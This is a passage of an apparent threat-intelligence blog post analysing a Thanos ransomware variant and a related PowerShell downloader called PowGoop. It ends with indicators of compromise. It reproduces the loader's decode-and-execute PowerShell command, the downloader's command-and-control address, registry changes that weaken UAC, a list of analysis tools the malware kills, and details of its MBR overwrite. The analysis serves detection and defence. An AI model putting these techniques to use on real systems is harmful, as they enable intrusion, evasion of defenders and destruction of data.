<td>p12</td>
<td>java</td>
<td>mov</td>
<td>mrimg</td>
</tr>
<tr>
<td>xlsx</td>
<td>pst</td>
<td>csr</td>
<td>class</td>
<td>xdw</td>
<td>qbb</td>
</tr>
<tr>
<td>xls</td>
<td>edb</td>
<td>gpg</td>
<td>mpeg</td>
<td>ods</td>
<td>rtf</td>
</tr>
<tr>
<td>avi</td>
<td>sql</td>
<td>aes</td>
<td>djvu</td>
<td>wav</td>
<td>7z</td>
</tr>
<tr>
<td>mp4</td>
<td>accdb</td>
<td>vsd</td>
<td>tiff</td>
<td>mp3</td>
<td></td>
</tr>
</tbody>
</table>
<p><em>Table 1. List of extensions of files that Thanos will encrypt. </em></p>
<p>This variant of Thanos writes a ransom note to a file named HOW_TO_DECYPHER_FILES.txt to the desktop and all of the folders that contained files that Thanos encrypted. The ransom note, as seen in Figure 2, requests 20,000$ worth of Bitcoin be transferred to a wallet 1F6sq8YvftTfuE4QcYxfK8s5XFUUHC7sD9 and a contact email of josephnull@secmail.pro to recover the encrypted files. The contact email and Bitcoin wallet ID were seen by other researchers and organizations in July 2020, as seen in the .HTA ransom note displayed in <a href="https://www.fortinet.com/blog/threat-research/analysis-of-net-thanos-ransomware-supporting-safeboot-with-networking-mode">Fortinets blog</a> and several <a href="https://twitter.com/JAMESWT_MHT/status/1281515013132496896">tweets</a>.</p>
<p><img class="aligncenter wp-image-108604" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/09/word-image-3.png" alt="HOW_TO_DECRYPT_YOUR_FILES.txt - Notepad - This shows a Thanos ransomware message displayed to victims, including the following text: &quot;Your files are Encrypted. Don't worry, you can return all your files! I don't want to loose your files too. If I want to do something bad to you I would've wipe all of your network but that's not helping me. :) so temporary all of your files is mine now until you pay the price of them. If you want to restore them contact me from the address below, I'll be happy to help you to get out of this situation. You've got 48 hours (2 Days), before you lost your files forever. I will treat you good if you treat me good too.&quot; The note closes with contact info, a Bitcoin wallet ID and a demand for &quot;20,000$.&quot;" width="900" height="398" /></p>
<p>The features and functionality within the Thanos ransomware have been analyzed by other organizations. Instead of rehashing this analysis, we will only discuss the functionality that was enabled within this variant of Thanos that had not been discussed previously. However, we delineate which previously discussed functionalities are disabled and enabled in this variant of Thanos in Tables 2 and 3 respectively.</p>
<table>
<tbody>
<tr>
<td>Max. File Size</td>
<td>Protect Process</td>
<td>Disable FAC</td>
</tr>
<tr>
<td>Persistence &#8211; Melt</td>
<td>Wallpaper</td>
<td>Static Pass</td>
</tr>
<tr>
<td>Deceiving Msg</td>
<td>Immortal Process</td>
<td>RIPlace</td>
</tr>
<tr>
<td>Unlock Files</td>
<td>FTP Logger</td>
<td>Data Stealer</td>
</tr>
<tr>
<td>Anti-VM</td>
<td>Wake-on-LAN</td>
<td>Max. Steal Size</td>
</tr>
<tr>
<td>Delay</td>
<td>Delayed Activation</td>
<td>Alternate Algo</td>
</tr>
<tr>
<td>AMSI Bypass</td>
<td>Client Expiration</td>
<td>Drag and Drop</td>
</tr>
</tbody>
</table>
<p><em>Table 2. Disabled functionality, which are likely unchecked boxes on the Thanos ransomware builder user interface (UI). </em></p>
<table>
<tbody>
<tr>
<td>Kill Defender</td>
<td>Fast Mode</td>
<td>Enhanced Notifications</td>
</tr>
<tr>
<td>LAN</td>
<td>AntiKill</td>
<td>Customize Notifications</td>
</tr>
</tbody>
</table>
<p><em>Table 3. Enabled functionality, which are likely checked boxes on the Thanos ransomware builder UI. </em></p>
<p>The first configuration option enabled that doesn&#8217;t match the analysis of previous variants of Thanos starts with the code trying to disable User Account Control (UAC) by setting the keys &#8220;LocalAccountTokenFilterPolicy&#8221; and &#8220;EnableLinkedConnections&#8221; in SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System to 1. It then attempts to enumerate local and mapped storage volumes. To enumerate the local volumes, the code creates and runs a batch script that is almost exactly the same as the batch script used by Ragnar Locker ransomware to enumerate the local storage volumes. Ragnar Locker used this script to create a VirtualBox configuration file that sets these volumes as SharedFolders, which allows Ragnar Locker to access the local storage volumes while it runs within a VirtualBox virtual machine, as discussed by <a href="https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/">Sophos</a>. The Thanos implementation does not write the results to a VirtualBox configuration file. Instead, it just prints the configuration to the screen, but does not save the output. Therefore, we cannot be certain of the purpose of this functionality.</p>
<p>The second functionality enabled in this sample that had not been observed in previous Thanos variants involved the ability to overwrite the master boot record (MBR). Once the code checks to see if the operating system version is not &#8220;Windows 10&#8221; or &#8220;Windows 8,&#8221; the code will attempt to open &#8220;\\.\PhysicalDrive0&#8221; and write a 512-byte string to offset 0. The byte array that is written to offset 0 of &#8220;\\.\PhysicalDrive0&#8221; initially has a ransom message of &#8220;Your files are encrypted. Contact us at: get-my-data@protonmail.com&#8230;&#8221;, but the code will replace this string with the following string before writing to disk:</p>
<p><span style="font-family: 'courier new', courier, monospace;">Don\xe2\x80\x99t worry, you can return all your files!\r\n\r\nThe Price to get all things to the normal : 20,000$\r\nMy BTC Wallet ID :\r\n1F6sq8YvftTfuE4QcYxfK8s5XFUUHC7sD9\r\n\r\nContact: josephnull@secmail.pro\r\n</span></p>
<p>The interesting part of the overwriting of the MBR in this specific sample is that it does not work correctly, which can be blamed on either a programming error or the custom message included by the actor. As you can see above, the custom message has the bytes &#8220;\xe2\x80\x99&#8221; for the apostrophe character in unicode, but the code attempts to convert each character using the &#8220;Convert.ToByte&#8221; function to replace a single byte in the initial ransom string. However, the unicode apostrophe character is three bytes long and causes an exception that breaks the MBR overwriting functionality. We confirmed that after changing this single character, the MBR overwriting functionality works, which results in the following being displayed instead of Windows booting correctly:</p>
<p><img class="aligncenter wp-image-108606" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/09/word-image-4.png" alt="This Thanos ransomware message reads: &quot;Dont worry, you can return all your files! The Price to get all things to the normal : 20,000$&quot; It closes with a Bitcoin wallet ID and a contact email. " width="720" height="400" /></p>
<p>The third previously unmentioned functionality in this Thanos sample involves creating a thread that watches for newly connected storage volumes. The code uses a management event watcher that calls a function when a new storage volume is connected using the following WMI query:</p>
<p><span style="font-family: 'courier new', courier, monospace;">SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2</span></p>
<p>When the event watcher detects a new storage volume connected, it creates a thread that carries out the file encrypting functionality used by Thanos to encrypt files on the original storage volumes.</p>
<p>The last functionality added to this version of Thanos is the ability to detect and kill more analysis tools to evade detection and analysis. The sample will enumerate through running processes and kill those whose names match the following:</p>
<table>
<tbody>
<tr>
<td>http analyzer stand-alone</td>
<td>intercepter</td>
<td>procexp64</td>
</tr>
<tr>
<td>fiddler</td>
<td>Intercepter-NG</td>
<td>RDG Packer Detector</td>
</tr>
<tr>
<td>effetech http sniffer</td>
<td>ollydbg</td>
<td>CFF Explorer</td>
</tr>
<tr>
<td>firesheep</td>
<td>x64dbg</td>
<td>PEiD</td>
</tr>
<tr>
<td>IEWatch Professional</td>
<td>x32dbg</td>
<td>protection_id</td>
</tr>
<tr>
<td>dumpcap</td>
<td>dnspy</td>
<td>LordPE</td>
</tr>
<tr>
<td>wireshark</td>
<td>dnspy-x86</td>
<td>pe-sieve</td>
</tr>
<tr>
<td>wireshark portable</td>
<td>de4dot</td>
<td>MegaDumper</td>
</tr>
<tr>
<td>sysinternals tcpview</td>
<td>ilspy</td>
<td>UnConfuserEx</td>
</tr>
<tr>
<td>NetworkMiner</td>
<td>dotpeek</td>
<td>Universal_Fixer</td>
</tr>
<tr>
<td>NetworkTrafficView</td>
<td>dotpeek64</td>
<td>NoFuserEx</td>
</tr>
<tr>
<td>HTTPNetworkSniffer</td>
<td>ida64</td>
<td></td>
</tr>
<tr>
<td>tcpdump</td>
<td>procexp</td>
<td></td>
</tr>
</tbody>
</table>
<p><em>Table 4. List of tools this Thanos variant will detect and kill to evade detection</em></p>
<h2><a id="post-108595-_evwui5e3xnvg"></a><strong>Possibly Related Downloader: Introducing PowGoop</strong></h2>
<p>While we cannot confirm the connection, we believe the actors deploying the Thanos ransomware at the Middle Eastern state-run organization also used a downloader that we call PowGoop. The actors would use the PowGoop downloader to reach out to a remote server to download and execute additional PowerShell scripts. The files existed in the same environment as the LogicalDuckBill sample previously discussed, but we did not observe the actors specifically running both PowGoop and the LogicalDuckBill spreader. Also, as expected, there is very little code overlap between the PowerShell code in this downloader and LogicalDuckBill, as their functionality differs dramatically. The only code overlap is a common variable name $a that both of the scripts use to store the base64 encoded data prior to decoding, which is not a strong enough connection to suggest a common author.</p>
<p>The PowGoop downloader has two components: a DLL loader and a PowerShell-based downloader. The PowGoop loader component is responsible for decrypting and running the PowerShell code that comprises the PowGoop downloader. The PowGoop loader DLL that existed in the same environment as LogicalDuckBill had a filename of goopdate.dll that was likely sideloaded by the legitimate and signed Google Update executable. The sideloading process would start with the legitimate GoogleUpdate.exe file loading a legitimate DLL with a name of goopdate86.dll. The sideloading would occur when the goopdate86.dll library loads the goopdate.dll file, which effectively runs the PowGoop loader. We observed the following files that are likely associated:</p>
<table>
<tbody>
<tr>
<td><strong>SHA256</strong></td>
<td><strong>Filename</strong></td>
</tr>
<tr>
<td><span style="font-family: 'courier new', courier, monospace;">b60e92004d394d0b14a8953a2ba29951c79f2f8a6c94f495e3153dfbbef115b6</span></td>
<td>GoogleUpdate.exe</td>
</tr>
<tr>
<td><span style="font-family: 'courier new', courier, monospace;">dea45dd3a35a5d92efa2726b52b0275121dceafdc7717a406f4cd294b10cd67e</span></td>
<td>goopdate86.dll</td>
</tr>
<tr>
<td><span style="font-family: 'courier new', courier, monospace;">a224cbaaaf43dfeb3c4f467610073711faed8d324c81c65579f49832ee17bda8</span></td>
<td>goopdate.dll</td>
</tr>
<tr>
<td><span style="font-family: 'courier new', courier, monospace;">b7437e3d5ca22484a13cae19bf805983a2e9471b34853d95b67d4215ec30a00e</span></td>
<td>config.dat</td>
</tr>
</tbody>
</table>
<p><em>Table 5. List of files associated with the sideloading of the PowGoop downloader</em></p>
<p>The goopdate.dll file is the PowGoop loader, whose functionality exists within an exported function named <span style="font-family: 'courier new', courier, monospace;">DllRegisterServer</span>. The goopdate.dll files <span style="font-family: 'courier new', courier, monospace;">DllEntryPoint</span> function, which would be called if loaded via the sideloading process mentioned above, does nothing more than attempt to run the <span style="font-family: 'courier new', courier, monospace;">DllRegisterServer</span> exported function using the following command:</p>
<p><span style="font-family: 'courier new', courier, monospace;">rundll32.exe &lt;module filename&gt;,DllRegisterServer</span></p>
<p>The functional code in <span style="font-family: 'courier new', courier, monospace;">DllRegisterServer</span> reads a file named <span style="font-family: 'courier new', courier, monospace;">config.dat</span>, decodes it and runs it as a PowerShell script, which is the PowGoop downloader component. To decode the <span style="font-family: 'courier new', courier, monospace;">config.dat</span> file, the DLL builds and executes a PowerShell script using the CreateProcessA function. The PowerShell script built by the PowGoop loader will read the contents of the <span style="font-family: 'courier new', courier, monospace;">config.dat</span> file, base64 decode and decrypt the contents using a simple subtract by two cipher and run the result PowGoop downloader script using the <span style="font-family: 'courier new', courier, monospace;">IEX</span> command, as seen in the following:</p>
<p><span style="font-family: 'courier new', courier, monospace;">powershell -exec bypass function bdec($in){$out = [System.Convert]::FromBase64String($in);return [System.Text.Encoding]::UTF8.GetString($out);}function bDec2($szinput){$in = [System.Text.Encoding]::UTF8.GetBytes($szinput);for ($i=0; $i -le $in.count -1; $i++){$in[$i] = $in[$i] &#8211; 2;}return [System.Text.Encoding]::UTF8.GetString($in);}function bDd($in){$dec = bdec $in;$temp = bDec2 $dec;return $temp;}$a=get-content C:\\Users\\[username]\\Desktop</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">config.dat;$t =bDd $a;iex($t);</span></p>
<p>The <span style="font-family: 'courier new', courier, monospace;">config.dat</span> file we decrypted is the PowGoop downloader that the actors configured to use the following URL as its command and control (C2):</p>
<p><span style="font-family: 'courier new', courier, monospace;">http://107.174.241[.]175:80/index.php</span></p>
<p>The PowGoop downloader will communicate with the C2 server via HTTP GET requests to this URL. It will expect the C2 server to respond to requests with base64 encoded data that the script will decode, decompress the decoded data using <span style="font-family: 'courier new', courier, monospace;">System.IO.Compression.GzipStream</span> and then decrypt the decompressed data using the same subtract by two cipher used to decrypt the <span style="font-family: 'courier new', courier, monospace;">config.dat</span> file. It will first communicate with the C2 to obtain a unique identifier value that the C2 will assign to the compromised system. After obtaining this identifier, the script will continue to communicate with the C2 to obtain <span style="font-family: 'courier new', courier, monospace;">Tasks</span>, which the script will decode, decompress, decrypt and run as PowerShell scripts. The script exfiltrates the result of a task to the C2 by encrypting the result using an add by two cipher, compressing the ciphertext and base64 encoding it, and transmitting it to the C2 server using a GET request with the data in the Cookie field of the HTTP request, specifically as the R value.</p>
<h2><a id="post-108595-_prnvhiwjznj"></a><strong>Conclusion</strong></h2>
<p>Actors used the Thanos ransomware to encrypt files and a PowerShell script to spread to additional systems, specifically on networks of two state-run organizations in the Middle East and North Africa. The Thanos variant created a text file that displayed a ransom message requesting the victim transfer 20,000$ into a specified Bitcoin wallet to restore the files on the system.</p>
<p>While the Thanos ransomware is not new, it appears that it is still under active development as the variant used in these attacks contained new functionality. The new functionality included the ability to detect and evade more analysis tools, the enumeration of local storage volumes via a technique used by the Ragnar Locker ransomware and a new capability to monitor for newly attached storage devices.</p>
<p>Most importantly, this variant of Thanos also included the new ability to overwrite the MBR and display the same ransom message. Overwriting the MBR is a much more destructive approach to ransomware than previously used by Thanos and would require more effort for victims to recover their files even if they paid the ransom.</p>
<p>Palo Alto Networks customers are protected from the attacks discussed in this blog in the following ways:</p>
<ul>
<li>All known Thanos ransomware and LogicalDuckBill samples have malicious verdicts in <a href="https://www.paloaltonetworks.com/products/secure-the-network/wildfire">WildFire</a>.</li>
<li>AutoFocus customers can track this ransomware, PowerShell spreading script and the potentially related downloader with the tags <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.Thanos">Thanos</a>, <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.LogicalDuckBill">LogicalDuckBill</a> and <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.PowGoop">PowGoop</a>.</li>
<li><a href="https://www.paloaltonetworks.com/cortex/cortex-xdr">Cortex XDR</a> blocks Thanos ransomware, LogicalDuckBill and PowGoop.</li>
</ul>
<h2><a id="post-108595-_ogkzogabs5um"></a><strong>Indicators of Compromise</strong></h2>
<h4><a id="post-108595-_mdpt6glbj3he"></a>LogicalDuckBill Samples</h4>
<p>40890a1ce7c5bf8fda7bd84b49c577e76e0431e4ce9104cc152694fc0029ccbf</p>
<p>06d5967a6b90b5b5f6a24b5f1e6bfc0fc5c82e7674817644d9c3de61008236dc</p>
<p>cbb95952001cdc3492ae8fd56701ceff1d1589bcfafd74be86991dc59385b82d</p>
<p>240e3bd7209dc5151b3ead0285e29706dff5363b527d16ebcc2548c0450db819</p>
<h4><a id="post-108595-_x9rji84oblm7"></a>Thanos Samples</h4>
<p>7aa46a296fbebdf3b13d399bf0dbe6e8a8fbcbc9ba696e5698326494b0da2e54<br />
58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f</p>
<p>c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850</p>
<p>ae66e009e16f0fad3b70ad20801f48f2edb904fa5341a89e126a26fd3fc80f75</p>
<p>5d40615701c48a122e44f831e7c8643d07765629a83b15d090587f469c77693d</p>
<h4><a id="post-108595-_81g324b5bmzx"></a>PowGoop Samples</h4>
<p>b60e92004d394d0b14a8953a2ba29951c79f2f8a6c94f495e3153dfbbef115b6 (legitimate Google installer, GoogleUpdate.exe)</p>
<p>dea45dd3a35a5d92efa2726b52b0275121dceafdc7717a406f4cd294b10cd67e (legitimate Google DLL, goopdate86.dll)</p>
<p>a224cbaaaf43dfeb3c4f467610073711faed8d324c81c65579f49832ee17bda8 (PowGoop Loader, goopdate.dll)</p>
<p>b7437e3d5ca22484a13cae19bf805983a2e9471b34853d95b67d4215ec30a00e PowGoop Downloader, config.dat)</p>
<h4><a id="post-108595-_lx6yjwih9est"></a>PowGoop Infrastructure</h4>
<p>107.174.241[.]175</p>
<p>&nbsp;</p>
          <div class="article__subscribe mb-40 text-gray-400 bg-gray-200 rounded-lg">
  <h4 class="h3 mb-10 text-black">Get updates from <br class="d-sm-none"> Palo Alto<br class="d-sm-none"> Networks!</h4>
  <p>Sign up to receive the latest news, cyber threat intelligence and research from us</p>
  <!-- <form action="https://app-guse4001.marketo.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe"> -->
  <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe">
    <input type="hidden" value="1086" name="formid">
    <!-- <input type="hidden" value="818-CZC-273" name="munchkinId"> -->
    <input type="hidden" value="531-OCS-018" name="munchkinId">
    <input type="hidden" value="2141" name="lpId">
    <input type="hidden" value="1086" name="formVid">
    <input type="hidden" name="mkto_optinunit42" value="true">
    <input type="hidden" name="mkto_opt-in" value="true">
    <div class="row">
      <div class="col-sm col-12 mb-sm-0 mb-15">
        <input type="email" name="Email" placeholder="Email address" class="subscribe-field d-block w-100 px-sm-25 px-15 bg-white">
        <p class="error-mail d-none mt-15 text-danger" style="color: #dc3545">Please enter your email address!</p>
      </div>
      <div class="col-sm-auto col-12">
          <input type="submit" value="Subscribe" class="btn btn--black btn--sm w-100" disabled="disabled">
      </div>
    </div>

    <div class="google-recapth mt-15">
      <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6LfKOrwUAAAAAOwgjxrEcx-pcfwe8OquUw6ommTK"></div>
      <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Please mark, I'm not a robot!</p>
    </div>
  </form>

  <div class="font-size-ex-sm col-sm-7 p-0">
    <p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
  </div>
</div>

<script type="text/javascript" src="https://researchcenter.paloaltonetworks.com/wp-content/plugins/google-analyticator/external-tracking.min.js?ver=6.4.9"></script>
        </div>
      </div>
    </div>
  </article>
<footer class="site-footer px-sm-0 px-15">
  <div class="pt-40">
    <div class="container pt-sm-30">
      <div class="row justify-content-lg-center">
        <div class="col-lg-11 col-12">
          <div class="row">
            <div class="col-lg-4 col-sm-3 col-12 order-sm-2">
              <nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right">
                                                <a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="ui ui-4"></span></a>
                <a href="https://github.com/pan-unit42" target="_blank"><span class="ui ui-5"></span></a>
              </nav>
            </div>

            <div class="col-lg-8 col-sm-9 col-12 order-sm-1">
              <div class="row">
                <div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Popular Resources</h4><div class="menu-footer-company-phase-container"><ul id="menu-footer-company-phase" class="menu"><li id="menu-item-97096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97096"><a target="_blank" href="https://www.paloaltonetworks.com/resources">Resource Center</a></li>
<li id="menu-item-97097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97097"><a target="_blank" href="https://researchcenter.paloaltonetworks.com/">Blog</a></li>
<li id="menu-item-97098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97098"><a target="_blank" href="https://www.paloaltonetworks.com/communities">Communities</a></li>
<li id="menu-item-97099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97099"><a target="_blank" href="https://docs.paloaltonetworks.com/">Tech Docs</a></li>
<li id="menu-item-97100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-97100"><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
<li id="menu-item-97101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97101"><a target="_blank" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Legal Notices</h4><div class="menu-footer-legal-notices-phase-container"><ul id="menu-footer-legal-notices-phase" class="menu"><li id="menu-item-97093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97093"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
<li id="menu-item-97094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97094"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
<li id="menu-item-97095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97095"><a target="_blank" href="https://www.paloaltonetworks.com/legal">Documents</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Account</h4><div class="menu-footer-trending-topics-phase-container"><ul id="menu-footer-trending-topics-phase" class="menu"><li id="menu-item-97102" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97102"><a href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a></li>
<li id="menu-item-97103" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97103"><a href="#">&nbsp;</a></li>
<li id="menu-item-97104" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97104"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
</ul></div></div>              </div>
            </div>
          </div>

          
            <div class="copyrights py-25 mt-40">
               <p> 2020 Palo Alto Networks, Inc. All rights reserved.</p>
            </div>
          
        </div>
      </div>
    </div>
  </div>
</footer>
    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
            <script type="text/javascript">
            (function(){
                document.addEventListener('DOMContentLoaded', function(){
                    let wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                    if ( wpp_widgets ) {
                        for (let i = 0; i < wpp_widgets.length; i++) {
                            let wpp_widget = wpp_widgets[i];
                            WordPressPopularPosts.theme(wpp_widget);
                        }
                    }
                });
            })();
        </script>
                <script>
            var WPPImageObserver = null;

            function wpp_load_img(img) {
                if ( ! 'imgSrc' in img.dataset || ! img.dataset.imgSrc )
                    return;

                img.src = img.dataset.imgSrc;

                if ( 'imgSrcset' in img.dataset ) {
                    img.srcset = img.dataset.imgSrcset;
                    img.removeAttribute('data-img-srcset');
                }

                img.classList.remove('wpp-lazyload');
                img.removeAttribute('data-img-src');
                img.classList.add('wpp-lazyloaded');
            }

            function wpp_observe_imgs(){
                let wpp_images = document.querySelectorAll('img.wpp-lazyload'),
                    wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                if ( wpp_images.length || wpp_widgets.length ) {
                    if ( 'IntersectionObserver' in window ) {
                        WPPImageObserver = new IntersectionObserver(function(entries, observer) {
                            entries.forEach(function(entry) {
                                if (entry.isIntersecting) {
                                    let img = entry.target;
                                    wpp_load_img(img);
                                    WPPImageObserver.unobserve(img);
                                }
                            });
                        });

                        if ( wpp_images.length ) {
                            wpp_images.forEach(function(image) {
                                WPPImageObserver.observe(image);
                            });
                        }

                        if ( wpp_widgets.length ) {
                            for (var i = 0; i < wpp_widgets.length; i++) {
                                let wpp_widget_images = wpp_widgets[i].querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widgets[i].shadowRoot ) {
                                    wpp_widget_images = wpp_widgets[i].shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    wpp_widget_images.forEach(function(image) {
                                        WPPImageObserver.observe(image);
                                    });
                                }
                            }
                        }
                    } /** Fallback for older browsers */
                    else {
                        if ( wpp_images.length ) {
                            for (var i = 0; i < wpp_images.length; i++) {
                                wpp_load_img(wpp_images[i]);
                                wpp_images[i].classList.remove('wpp-lazyloaded');
                            }
                        }

                        if ( wpp_widgets.length ) {
                            for (var j = 0; j < wpp_widgets.length; j++) {
                                let wpp_widget = wpp_widgets[j],
                                    wpp_widget_images = wpp_widget.querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widget.shadowRoot ) {
                                    wpp_widget_images = wpp_widget.shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    for (var k = 0; k < wpp_widget_images.length; k++) {
                                        wpp_load_img(wpp_widget_images[k]);
                                        wpp_widget_images[k].classList.remove('wpp-lazyloaded');
                                    }
                                }
                            }
                        }
                    }
                }
            }

            document.addEventListener('DOMContentLoaded', function() {
                wpp_observe_imgs();

                // When an ajaxified WPP widget loads,
                // Lazy load its images
                document.addEventListener('wpp-onload', function(){
                    wpp_observe_imgs();
                });
            });
        </script>
        <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=5.4.1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/scripts/main.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=5.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20","information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
/* ]]> */
</script>
